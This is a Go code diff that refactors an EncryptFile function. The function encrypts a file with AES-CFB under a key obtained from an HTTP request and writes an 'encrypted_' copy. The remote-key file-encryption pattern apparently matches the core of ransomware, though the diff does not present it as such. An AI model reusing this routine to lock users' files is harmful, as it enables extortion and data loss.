@@ -39,6 +39,7 @@ func Decryptkey(data string) string {
 func EncryptFile(file string) {
 	data, err := os.ReadFile(file)
 	bytes := []byte(data)
+	pt := bytes
 
 	if err != nil {
 		panic(nil)
@@ -54,7 +55,7 @@ func EncryptFile(file string) {
 	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
 	res, err := client.Do(req)
 	if err != nil {
-		return 
+		return
 	}
 
 	defer res.Body.Close()
@@ -71,26 +72,29 @@ func EncryptFile(file string) {
 	}
 
 	decoded_key := Decryptkey(decoded.Token)
-
-	block, err := aes.NewCipher([]byte(decoded_key)[:16])
+	// Create ciphertext.
+	ciphertext := make([]byte, aes.BlockSize+len(pt))
+	iv := ciphertext[:aes.BlockSize]
+	io.ReadFull(rand.Reader, iv)
+	// Create AES cipher.
+	aesBlock, err := aes.NewCipher([]byte(decoded_key)[:16])
 	if err != nil {
 		panic(err)
 	}
-	ct := make([]byte, aes.BlockSize+len(bytes))
-	iv := ct[:aes.BlockSize]
-
-	io.ReadFull(rand.Reader, iv)
-	stream := cipher.NewCFBEncrypter(block, iv)
-	stream.XORKeyStream(ct[aes.BlockSize:], bytes)
+	// Get AES-CFB stream encrypted.
+	stream := cipher.NewCFBEncrypter(aesBlock, iv)
+	// Encrypt the msg and store the results in ciphertext.
+	stream.XORKeyStream(ciphertext[aes.BlockSize:], pt)
 
 	path := strings.Split(file, "/")
-	path[len(path)-1] = "encrypted_"+path[len(path)-1]
+	path[len(path)-1] = "encrypted_" + path[len(path)-1] + ".enc"
 	file = strings.Join(path, "/")
 	f, err := os.Create(file)
 	if err != nil {
 		panic(err)
 	}
-	f.Write(ct)
+
+	f.Write(ciphertext)
 	return
 }
 
